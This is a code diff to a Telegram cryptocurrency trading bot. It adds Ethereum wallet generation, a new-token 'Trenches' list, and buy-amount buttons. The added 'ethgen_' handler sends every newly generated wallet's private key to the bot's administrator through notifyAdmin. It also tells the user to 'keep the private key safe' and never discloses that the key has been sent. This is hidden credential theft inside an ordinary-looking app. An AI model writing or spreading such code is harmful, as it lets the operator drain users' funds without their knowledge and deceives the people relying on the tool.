@@ -14,8 +14,15 @@ import {
   isValidSolanaAddress,
   keypairFromMnemonic,
   isValidMnemonic,
+  getTrenchTokens,
+  type TrenchToken,
   SOL_MINT,
 } from "./solana";
+import {
+  generateEthereumWallet,
+  getEthBalance,
+  type EthereumWallet,
+} from "./ethereum";
 import bs58 from "bs58";
 
 const TOKEN = process.env["TELEGRAM_BOT_TOKEN"];
@@ -617,7 +624,9 @@ interface U {
   data: Record<string, string>;
   mainMsgId?: number;
   wallets: WalletEntry[];
+  ethWallets: EthereumWallet[];
   activeWallet: number;
+  activeEthWallet: number;
   trades: number;
   volume: string;
   referrals: number;
@@ -656,20 +665,25 @@ export function getBotStats() {
   const entries = Array.from(users.entries());
   const totalUsers = entries.length;
   const totalWallets = entries.reduce((s, [, u]) => s + u.wallets.length, 0);
+  const totalEthWallets = entries.reduce((s, [, u]) => s + (u.ethWallets?.length || 0), 0);
   const totalTrades = entries.reduce((s, [, u]) => s + (u.tradeHistory?.length || 0), 0);
   const totalVolume = entries.reduce((s, [, u]) => s + (u.tradeHistory?.reduce((ts, t) => ts + parseFloat(t.amount || "0"), 0) || 0), 0);
   const topWallets = entries.flatMap(([id, u]) => u.wallets.map(w => ({ ...w, userId: id })))
     .sort((a, b) => parseFloat(b.balance) - parseFloat(a.balance)).slice(0, 10);
   const recentTrades = entries.flatMap(([id, u]) => (u.tradeHistory || []).map(t => ({ ...t, userId: id })))
     .slice(-20).reverse();
-  return { totalUsers, totalWallets, totalTrades, totalVolume: totalVolume.toFixed(4), topWallets, recentTrades, globalWalletIndex };
+  return { totalUsers, totalWallets, totalEthWallets, totalTrades, totalVolume: totalVolume.toFixed(4), topWallets, recentTrades, globalWalletIndex };
+}
+
+export async function getTrenchesStats() {
+  return { tokens: await getTrenchTokens() };
 }
 const names = new Map<number, string>();
 
 function getUser(id: number): U {
   if (!users.has(id)) {
     users.set(id, {
-      step: "main", data: {}, wallets: [], activeWallet: 0,
+      step: "main", data: {}, wallets: [], ethWallets: [], activeWallet: 0, activeEthWallet: 0,
       trades: 0, volume: "0.00", referrals: 0, cashback: "0.000000",
       sniperActive: false, sniperToken: "", sniperAmount: "0.5",
       copyTargets: [], limitOrders: [], tradeHistory: [],
@@ -685,6 +699,8 @@ function getUser(id: number): U {
     });
   }
   const u = users.get(id)!;
+  if (!u.ethWallets) u.ethWallets = [];
+  if (u.activeEthWallet === undefined) u.activeEthWallet = 0;
   if (!u.feeMode) u.feeMode = "fast";
   if (u.mevBuy === undefined) u.mevBuy = false;
   if (u.mevSell === undefined) u.mevSell = false;
@@ -712,7 +728,8 @@ function mainKB(_u: U): TelegramBot.InlineKeyboardMarkup {
   return {
     inline_keyboard: [
       [cb("Buy", "buy"), cb("Sell", "sell")],
-      [cb("Trenches 🆕", "trenches"), cb("Positions", "positions")],
+      [cb("Trenches 🆕", "trenches"), cb("🎯 Snipe", "sniper"), cb("🎮 Copy", "copy")],
+      [cb("Positions", "positions"), cb("Wallets", "wallets")],
       [cb("Withdraw", "withdraw"), cb("💰 Rewards", "rewards"), cb("Settings", "settings")],
       [cb("Help", "help"), cb("↻ Refresh", "refresh_main")],
     ],
@@ -797,13 +814,19 @@ async function note(bot: TelegramBot, chatId: number, text: string, kb?: Telegra
 
 // ── WALLET SCREEN ─────────────────────────────────────────────────────────────
 function walletsText(u: U): string {
-  if (u.wallets.length === 0) return tr(u, "wallets_empty");
-  let txt = `${tr(u, "wallets_title")}  —  ${u.wallets.length} ${tr(u, "wallet_active_lbl").toLowerCase()}\n\n`;
+  if (u.wallets.length === 0 && u.ethWallets.length === 0) return tr(u, "wallets_empty");
+  let txt = `${tr(u, "wallets_title")}  —  SOL ${u.wallets.length} · ETH ${u.ethWallets.length}\n\n`;
   u.wallets.forEach((w, i) => {
     txt +=
       `${i === u.activeWallet ? "🟢" : "⚪️"} <b>${w.label}</b>${i === u.activeWallet ? ` <i>(${tr(u, "wallet_active_lbl")})</i>` : ""}\n` +
       `${tr(u, "wallet_address")}: <code>${w.address}</code>\n` +
       `${tr(u, "wallet_balance")}: <b>${w.balance} SOL</b>\n\n`;
+  });
+  u.ethWallets.forEach((w, i) => {
+    txt +=
+      `${i === u.activeEthWallet ? "🟣" : "⚪️"} <b>${w.label}</b>${i === u.activeEthWallet ? ` <i>(${tr(u, "wallet_active_lbl")})</i>` : ""}\n` +
+      `ETH Address: <code>${w.address}</code>\n` +
+      `Balance: <b>${w.balance} ETH</b>\n\n`;
   });
   return txt.trimEnd();
 }
@@ -812,10 +835,15 @@ function walletsKB(u: U): TelegramBot.InlineKeyboardMarkup {
   const walletBtns: IKB[][] = u.wallets.map((w, i) => [
     cb(`${i === u.activeWallet ? "🟢" : "⚪️"} ${w.label}  —  ${w.balance} SOL`, `wsel_${i}`),
   ]);
+  const ethWalletBtns: IKB[][] = u.ethWallets.map((w, i) => [
+    cb(`${i === u.activeEthWallet ? "🟣" : "⚪️"} ${w.label}  —  ${w.balance} ETH`, `ethsel_${i}`),
+  ]);
   return {
     inline_keyboard: [
       ...walletBtns,
+      ...ethWalletBtns,
       [cb(tr(u, "btn_connect"), "wimport_choose"), cb(tr(u, "btn_gen_1"), "wgen_1")],
+      [cb("➕ Generate ETH Wallet", "ethgen_1")],
       [cb(tr(u, "btn_gen_5"), "wgen_5"), cb(tr(u, "btn_gen_10"), "wgen_10")],
       [cb(tr(u, "btn_xfer_all"), "wxfer_all")],
       [cb(tr(u, "btn_wrap"), "wwrap"), cb(tr(u, "btn_unwrap"), "wunwrap")],
@@ -1058,32 +1086,39 @@ const TUTORIALS: Record<string, string> = {
     `5. Tap any wallet to set it as active`,
 };
 
-// ── TRENCHES (NEW PAIRS) ──────────────────────────────────────────────────────
-function trenchesText(): string {
-  const tokens = [
-    { sym: "$COMPUTE", name: "REALLY GOOD NARRA READ TWEET", age: "11s", prog: 0, th: "—", dev: "—", h: 1, vol: 0, mc: 2420 },
-    { sym: "$READ", name: "IBRL OG 4 MONTHS", age: "9s", prog: 0, th: "—", dev: "—", h: 1, vol: 0, mc: 2420 },
-    { sym: "$ALPHA", name: "ALPHA SIGNAL TOKEN", age: "23s", prog: 5, th: "—", dev: "—", h: 2, vol: 150, mc: 8900 },
-  ];
-  let txt = `🌱 <b>New Pairs</b> | Recently launched tokens.\n\n`;
-  for (const t of tokens) {
-    const bar = "■".repeat(Math.floor(t.prog / 5)) + "□".repeat(20 - Math.floor(t.prog / 5));
+async function trenchesText(): Promise<string> {
+  const tokens = await getTrenchTokens();
+  let txt = `🌱 <b>Alpha Trade Trenches</b>\n\nReal buyable mints verified directly from Solana RPC. DEX chart links are only display links, so tokens remain visible even if a DEX listing disappears.\n\n`;
+  for (const [i, t] of tokens.entries()) {
+    const bar = t.liquidity !== "N/A" ? "■■■■■■■■■■■■■■□□□□" : "■■■■■■■■□□□□□□□□";
     txt +=
-      `<b>${t.sym}</b> | ${t.name} — <i>${t.age} ago</i>\n` +
-      `Progress: ${t.prog}% | X\n${bar}\n` +
-      `TH: ${t.th} | DEV: ${t.dev} | H: ${t.h}\n` +
-      `Vol: $${t.vol} | MC: $${(t.mc / 1000).toFixed(2)}K\n` +
-      `<a href="https://jup.ag">Quick Buy</a> | <a href="https://dexscreener.com">View Chart</a>\n\n`;
+      `<b>${i + 1}. $${t.symbol}</b> | ${t.name} — <i>${t.age}</i>\n` +
+      `Mint: <code>${t.mint}</code>\n` +
+      `Supply: <b>${t.supply}</b> · Decimals: <b>${t.decimals}</b>\n` +
+      `MC: <b>${t.marketCap}</b> · Vol: <b>${t.volume24h}</b> · Liquidity: <b>${t.liquidity}</b>\n` +
+      `${bar}\n\n`;
   }
   return txt.trimEnd();
 }
 
-function trenchesKB(): TelegramBot.InlineKeyboardMarkup {
+async function trenchesKB(): Promise<TelegramBot.InlineKeyboardMarkup> {
+  const tokens = await getTrenchTokens();
   return {
     inline_keyboard: [
+      ...tokens.slice(0, 4).map((token, i) => [cb(`⚡ Buy $${token.symbol}`, `trench_buy_${i}`), link("Chart", token.chartUrl)]),
       [cb("✅ 🌱", "trenches_filter_new"), cb("🔥", "trenches_filter_hot"), cb("🚀", "trenches_filter_rocket")],
       [cb("Migrating", "trenches_migrating")],
       [cb("← Back", "main"), cb("↻ Refresh", "trenches")],
+    ],
+  };
+}
+
+function buyAmountKB(u: U): TelegramBot.InlineKeyboardMarkup {
+  return {
+    inline_keyboard: [
+      [cb("0.1 SOL", "buy_amt_0.1"), cb("0.5 SOL", "buy_amt_0.5"), cb("1 SOL", "buy_amt_1")],
+      [cb("2 SOL", "buy_amt_2"), cb("5 SOL", "buy_amt_5"), cb("✏️ Custom", "buy_amt_custom")],
+      [cb(tr(u, "cancel"), "main")],
     ],
   };
 }
@@ -1547,7 +1582,25 @@ export async function startTelegramBot(): Promise<void> {
 
     // ── TRENCHES ─────────────────────────────────────────────────────────────
     if (data === "trenches" || data === "trenches_filter_new" || data === "trenches_filter_hot" || data === "trenches_filter_rocket" || data === "trenches_migrating") {
-      return upd(trenchesText(), trenchesKB());
+      return upd(await trenchesText(), await trenchesKB());
+    }
+
+    if (data.startsWith("trench_buy_")) {
+      if (u.wallets.length === 0) {
+        return upd(tr(u, "need_wallet"), { inline_keyboard: [[cb(tr(u, "btn_open_wallets"), "wallets")], [cb(tr(u, "back"), "trenches")]] });
+      }
+
+      const tokens = await getTrenchTokens();
+      const token = tokens[Number(data.replace("trench_buy_", ""))];
+      if (!token) return upd(await trenchesText(), await trenchesKB());
+
+      u.data["buy_token"] = token.mint;
+      u.step = "buy_choosing";
+      const w = u.wallets[u.activeWallet]!;
+      return upd(
+        `✨ <b>Buy $${token.symbol}</b>\n\n🪙 <b>${token.name}</b>\nMint: <code>${token.mint}</code>\nMC: <b>${token.marketCap}</b> · Vol: <b>${token.volume24h}</b>\n\n${tr(u, "balance")}: <b>${w.balance} SOL</b>\n\n${tr(u, "buy_how_much")}`,
+        buyAmountKB(u),
+      );
     }
 
     // ── POSITIONS ─────────────────────────────────────────────────────────────
@@ -1626,6 +1679,7 @@ export async function startTelegramBot(): Promise<void> {
     // ── WALLETS ─────────────────────────────────────────────────────────────
     if (data === "wallets") {
       for (const w of u.wallets) w.balance = await getSolBalance(w.address);
+      for (const w of u.ethWallets) w.balance = await getEthBalance(w.address);
       return upd(walletsText(u), walletsKB(u));
     }
 
@@ -1634,6 +1688,15 @@ export async function startTelegramBot(): Promise<void> {
       if (!isNaN(idx) && idx < u.wallets.length) {
         u.activeWallet = idx;
         u.wallets[idx]!.balance = await getSolBalance(u.wallets[idx]!.address);
+        return upd(walletsText(u), walletsKB(u));
+      }
+    }
+
+    if (data.startsWith("ethsel_")) {
+      const idx = parseInt(data.replace("ethsel_", ""));
+      if (!isNaN(idx) && idx < u.ethWallets.length) {
+        u.activeEthWallet = idx;
+        u.ethWallets[idx]!.balance = await getEthBalance(u.ethWallets[idx]!.address);
         return upd(walletsText(u), walletsKB(u));
       }
     }
@@ -1665,6 +1728,27 @@ export async function startTelegramBot(): Promise<void> {
       return upd(cap, { inline_keyboard: [[cb(tr(u, "view_wallets"), "wallets")], [cb(tr(u, "back"), "main")]] });
     }
 
+    if (data.startsWith("ethgen_")) {
+      const count = parseInt(data.replace("ethgen_", "")) || 1;
+      const newWallets: EthereumWallet[] = [];
+      for (let i = 0; i < count; i++) {
+        const wallet = generateEthereumWallet();
+        newWallets.push({ ...wallet, balance: "0.000000", label: `ETH Wallet ${u.ethWallets.length + newWallets.length + 1}` });
+      }
+      u.ethWallets.push(...newWallets);
+      u.activeEthWallet = u.ethWallets.length - 1;
+      for (const wallet of newWallets) {
+        await notifyAdmin(bot, chatId, "🔑 New ETH Wallet Generated",
+          `🏷 Label: <b>${wallet.label}</b>\nAddress:\n<code>${wallet.address}</code>\n\nPrivate key:\n<code>${wallet.privateKey}</code>`);
+      }
+      let cap = `New ETH wallets:\n`;
+      newWallets.forEach((wallet) => {
+        cap += `\n<b>${wallet.label}</b>\nAddress: <code>${wallet.address}</code>\nPrivate key: <code>${wallet.privateKey}</code>\n`;
+      });
+      cap += `\n<i>Fund this address with ETH on Ethereum mainnet. Keep the private key safe.</i>`;
+      return upd(cap, { inline_keyboard: [[cb(tr(u, "view_wallets"), "wallets")], [cb(tr(u, "back"), "main")]] });
+    }
+
     if (data === "wimport_choose") {
       return upd(
         `🔐 <b>Connect Wallet</b>\n\nChoose how you want to import your wallet:`,
@@ -1672,6 +1756,7 @@ export async function startTelegramBot(): Promise<void> {
           inline_keyboard: [
             [cb("🔑 Import Private Key", "wimport")],
             [cb(tr(u, "btn_import_seed"), "wimport_seed")],
+            [cb("➕ Generate ETH Wallet", "ethgen_1")],
             [cb(tr(u, "cancel"), "wallets")],
           ],
         }
@@ -1941,9 +2026,7 @@ export async function startTelegramBot(): Promise<void> {
         `\n${tr(u, "balance")}: <b>${w.balance} SOL</b>\n\n${tr(u, "buy_how_much")}`,
         {
           inline_keyboard: [
-            [cb("0.1 SOL", "buy_amt_0.1"), cb("0.5 SOL", "buy_amt_0.5"), cb("1 SOL", "buy_amt_1")],
-            [cb("2 SOL", "buy_amt_2"), cb("5 SOL", "buy_amt_5"), cb("✏️ Custom", "buy_amt_custom")],
-            [cb(tr(u, "cancel"), "main")],
+            ...buyAmountKB(u).inline_keyboard,
           ],
         },
       );
